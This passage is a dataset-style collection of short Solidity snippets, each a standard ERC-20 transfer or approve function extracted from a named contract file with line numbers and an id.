    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="690" endline="693" pcid="8077">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="73" endline="76" pcid="3580">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="71" endline="74" pcid="8585">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="72" endline="75" pcid="549">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="84" endline="87" pcid="8869">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="81" endline="84" pcid="9280">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="77" endline="80" pcid="8199">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="179" endline="182" pcid="7371">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="83" endline="86" pcid="3582">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="81" endline="84" pcid="3226">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="78" endline="81" pcid="1433">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="71" endline="74" pcid="2766">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="74" endline="77" pcid="8867">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="84" endline="87" pcid="1834">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="145" endline="148" pcid="3741">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="81" endline="84" pcid="6943">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="78" endline="81" pcid="4366">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="80" endline="83" pcid="3807">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="77" endline="80" pcid="2236">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="79" endline="82" pcid="3347">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="71" endline="74" pcid="6941">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="267" endline="270" pcid="7877">
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="87" endline="90" pcid="6928">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="84" endline="87" pcid="3444">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="71" endline="74" pcid="6870">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="80" endline="83" pcid="8322">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="77" endline="80" pcid="6187">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="143" endline="146" pcid="3817">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="77" endline="80" pcid="6926">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="73" endline="76" pcid="2289">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="68" endline="71" pcid="4364">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="71" endline="74" pcid="5880">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2dae79a98c60696b65d591700dfeb9422ab2735c.sol" startline="55" endline="58" pcid="1353">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="143" endline="146" pcid="3161">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="74" endline="77" pcid="4333">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="80" endline="83" pcid="4064">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="74" endline="77" pcid="2736">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="84" endline="87" pcid="4335">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="248" endline="251" pcid="7875">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="74" endline="77" pcid="2838">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="67" endline="70" pcid="6185">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="68" endline="71" pcid="4888">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="83" endline="86" pcid="9334">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="68" endline="71" pcid="3274">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="75" endline="78" pcid="2405">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="83" endline="86" pcid="6168">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="73" endline="76" pcid="4078">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x07d02e6806fe51ba3488ba0536589cdbd393ff15.sol" startline="1508" endline="1511" pcid="200">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="72" endline="75" pcid="8275">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="75" endline="78" pcid="5690">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="83" endline="86" pcid="3076">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="690" endline="693" pcid="4093">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="74" endline="77" pcid="9022">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="73" endline="76" pcid="6166">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="69" endline="72" pcid="3345">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="82" endline="85" pcid="7329">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="83" endline="86" pcid="2964">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="81" endline="84" pcid="280">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="81" endline="84" pcid="7505">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="77" endline="80" pcid="8738">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="78" endline="81" pcid="4890">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="72" endline="75" pcid="2943">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="89" endline="92" pcid="8770">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="84" endline="87" pcid="1373">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="87" endline="90" pcid="8740">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="81" endline="84" pcid="3929">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="80" endline="83" pcid="5867">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="84" endline="87" pcid="3489">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="72" endline="75" pcid="3310">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="73" endline="76" pcid="2136">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="71" endline="74" pcid="3289">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="81" endline="84" pcid="8837">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="72" endline="75" pcid="3650">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="65" endline="68" pcid="2301">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="73" endline="76" pcid="9332">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5fae3af584495c5c2cbaa83740e55037a6633368.sol" startline="26" endline="29" pcid="3629">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="70" endline="73" pcid="8020">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="77" endline="80" pcid="564">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="70" endline="73" pcid="5865">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="74" endline="77" pcid="2913">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="77" endline="80" pcid="579">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="80" endline="83" pcid="7654">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="72" endline="75" pcid="3713">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="83" endline="86" pcid="7475">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="74" endline="77" pcid="7577">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="83" endline="86" pcid="3181">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="77" endline="80" pcid="9078">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="70" endline="73" pcid="2345">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="71" endline="74" pcid="2360">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="81" endline="84" pcid="6872">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="81" endline="84" pcid="3291">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="83" endline="86" pcid="2855">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="72" endline="75" pcid="4728">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="74" endline="77" pcid="3427">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="89" endline="92" pcid="5852">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="138" endline="141" pcid="4900">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="82" endline="85" pcid="69">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="79" endline="82" pcid="5850">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="74" endline="77" pcid="1386">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="167" endline="170" pcid="4905">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="72" endline="75" pcid="961">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="83" endline="86" pcid="4860">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="84" endline="87" pcid="3429">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="70" endline="73" pcid="8783">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="79" endline="82" pcid="2691">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="81" endline="84" pcid="2768">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="84" endline="87" pcid="7639">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="85" endline="88" pcid="5692">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="81" endline="84" pcid="5833">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="80" endline="83" pcid="8247">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="71" endline="74" pcid="5831">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="408" endline="411" pcid="9316">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="54" endline="57" pcid="591">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="74" endline="77" pcid="875">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="82" endline="85" pcid="3652">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="82" endline="85" pcid="3196">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="80" endline="83" pcid="8695">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="84" endline="87" pcid="1388">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="144" endline="147" pcid="3939">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="71" endline="74" pcid="8835">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfd0d43a6f56f17d6efe203410a9306a7953885e5.sol" startline="53" endline="56" pcid="9218">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="82" endline="85" pcid="4730">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="71" endline="74" pcid="1260">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="72" endline="75" pcid="6151">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="57" endline="60" pcid="4915">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="67" endline="70" pcid="4917">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="84" endline="87" pcid="333">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="70" endline="73" pcid="8693">
